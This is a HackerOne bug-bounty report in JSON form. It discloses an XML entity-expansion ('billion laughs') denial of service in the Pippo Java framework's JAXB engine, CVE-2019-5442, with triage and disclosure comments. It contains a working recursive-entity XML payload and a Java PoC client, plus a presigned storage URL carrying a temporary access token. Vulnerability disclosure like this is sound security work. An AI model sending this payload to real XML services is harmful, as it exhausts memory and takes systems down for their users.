{"id":506791,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY3OTE=","url":"https://hackerone.com/reports/506791","title":"Pippo XML Entity Expansion (Billion Laughs Attack)","state":"Closed","substate":"informative","severity_rating":"high","readable_substate":"Informative","created_at":"2019-03-08T15:19:48.688Z","submitted_at":"2019-03-08T15:19:48.688Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"amassey","url":"/amassey","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35524,"url":"https://hackerone.com/central-security-project","handle":"central-security-project","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Central Security Project","twitter_handle":"SaferOpenSource","website":"https://www.sonatype.com/central-security-project","about":"Ensuring Safer Open Source Across Ecosystems"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-5442"],"singular_disclosure_disabled":true,"disclosed_at":"2019-06-10T14:04:43.537Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-06-10T14:04:32.386Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Maven artifact\n**groupId:** ro.pippo\n**artifactId:** pippo-jaxb\n**version:** 1.12.0\n\n# Vulnerability\n## Vulnerability Description\n\u003e Pippo unsafely parses user provided XML. The `fromString()` in the `ro.pippo.jaxb.JaxbEngine` class allows user provided DTDs that the rest of the XML may reference. This can lead to recursive entity expansion and a subsequent billion laughs attack.\n\n## Additional Details\n**Source File and Line Number:** https://github.com/pippo-java/pippo/blob/7da9f4db945d10113cf4ea4ed44ba0f1a7f83a8f/pippo-content-type-parent/pippo-jaxb/src/main/java/ro/pippo/jaxb/JaxbEngine.java#L78\n\n## Steps To Reproduce:\n\u003e Detailed steps to reproduce with all required references/steps/commands. Any sample/exploit code or other proof of concept.\n\n1. Supply below XML payload as an argument to the following Java main method which is a client of Pippo.\n2. Enjoy watching the JVM crash.\n\n### XML Payload that Results in Recursive Entity Expansion\n```\n\u003c?xml version=\"1.0\"?\u003e\n\u003c!DOCTYPE PERSON [\n        \u003c!ENTITY PERSON \"PERSON\"\u003e\n        \u003c!ELEMENT PERSON (#PCDATA)\u003e\n        \u003c!ENTITY PERSON1 \"\u0026PERSON;\u0026PERSON;\u0026PERSON;\u0026PERSON;\u0026PERSON;\u0026PERSON;\u0026PERSON;\u0026PERSON;\u0026PERSON;\u0026PERSON;\"\u003e\n        \u003c!ENTITY PERSON2 \"\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\u0026PERSON1;\"\u003e\n        \u003c!ENTITY PERSON3 \"\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\u0026PERSON2;\"\u003e\n        \u003c!ENTITY PERSON4 \"\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\u0026PERSON3;\"\u003e\n        \u003c!ENTITY PERSON5 \"\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\u0026PERSON4;\"\u003e\n        \u003c!ENTITY PERSON6 \"\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\u0026PERSON5;\"\u003e\n        \u003c!ENTITY PERSON7 \"\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\u0026PERSON6;\"\u003e\n        \u003c!ENTITY PERSON8 \"\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\u0026PERSON7;\"\u003e\n        \u003c!ENTITY PERSON9 \"\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\u0026PERSON8;\"\u003e\n        ]\u003e\n\n\u003cPERSON\u003e\u0026PERSON9;\u003c/PERSON\u003e\n```\n\n### Java Code that acts as a Pippo Client\n```\nimport org.apache.commons.io.IOUtil;\nimport ro.pippo.jaxb.JaxbEngine;\nimport java.io.IOException;\n\n\npublic class JaxBEnginePoC {\n\n    public static void main(String[] args) throws IOException {\n\n        String resourceName = args[0];\n\n        String payload = IOUtil.toString(\n                JaxBEnginePoC.class.getResourceAsStream(resourceName),\n                \"UTF-8\"\n        );\n\n        JaxbEngine jaxbEngine = new JaxbEngine();\n        Object myObj = jaxbEngine.fromString(payload, Person.class);\n\n        System.out.println(\"Completed!\");\n    }\n}\n```\n\n## Patch\n\u003e If you're able to provide a patch with the fix, please post it in this section (or attach)\n\nxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, true); \n\nShould Be\n\nxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n\n## Supporting Material/References:\n\u003e State all technical information about the stack where the vulnerability was found\n- Darwin Kernel Version 18.2.0\n- Java jdk1.8.0_171\n\n# Wrap up\n\u003e Select Y or N for the following statements:\n- I contacted the maintainer to let them know: N \n- I opened an issue in the related repository: N\n\n\u003e Finder's comments and funny memes goes here\n\nhttp://i.imgur.com/3POtveC.jpg\n\nIs it pronounced imgur or imgur? Gif or Gif?\n\n## Impact\n\nIt causes a DoS. Specifically: Entities are created recursively and large amounts of heap memory is taken. Eventually, the JVM process will run out of memory. Otherwise, if the OS does not bound the memory on that process, memory will continue to be exhausted and will affect other processes on the system.","weakness":{"id":96,"name":"XML Entity Expansion"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":437737,"file_name":"pippo-poc-1.0-SNAPSHOT-sources.jar","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/737/a986600e7d9c20265a161d02a87d1e214485f5ee/pippo-poc-1.0-SNAPSHOT-sources.jar?response-content-disposition=attachment%3B%20filename%3D%22pippo-poc-1.0-SNAPSHOT-sources.jar%22%3B%20filename%2A%3DUTF-8%27%27pippo-poc-1.0-SNAPSHOT-sources.jar\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150738Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3905c3bb9e6607f2c99c7b97511a9e30b746f5edeb32d94c8fa756251ad4ffac","file_size":2871,"type":"application/zip"}],"allow_singular_disclosure_at":null,"vote_count":1,"voters":["tiago-danin"],"severity":{"rating":"high","score":8.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":17122,"asset_type":"SOURCE_CODE","asset_identifier":"Java Component in search.maven.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4286113,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\nThank you for your submission.  It is under review and we will get back to you shortly.","automated_response":false,"created_at":"2019-03-08T15:27:20.976Z","updated_at":"2019-03-08T15:27:20.976Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4286173,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-03-08T15:38:01.126Z","updated_at":"2019-03-08T15:38:01.126Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5041229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The repository maintainer was contacted multiple times with no response. As it has been 90 days, this report is being disclosed and a CVE assignment has been requested. We will continue to attempt to engage with the repository maintainer(s).\n","automated_response":false,"created_at":"2019-06-10T14:03:40.032Z","updated_at":"2019-06-10T14:03:40.032Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5041234,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# This vulnerability remains un-resolved","automated_response":false,"created_at":"2019-06-10T14:04:01.680Z","updated_at":"2019-06-10T14:04:01.680Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5041236,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"#","automated_response":false,"created_at":"2019-06-10T14:04:20.064Z","updated_at":"2019-06-10T14:04:20.064Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5041237,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-06-10T14:04:32.423Z","updated_at":"2019-06-10T14:04:32.423Z","first_to_agree":true,"actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5041238,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-06-10T14:04:43.480Z","updated_at":"2019-06-10T14:04:43.480Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13eb29c5b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}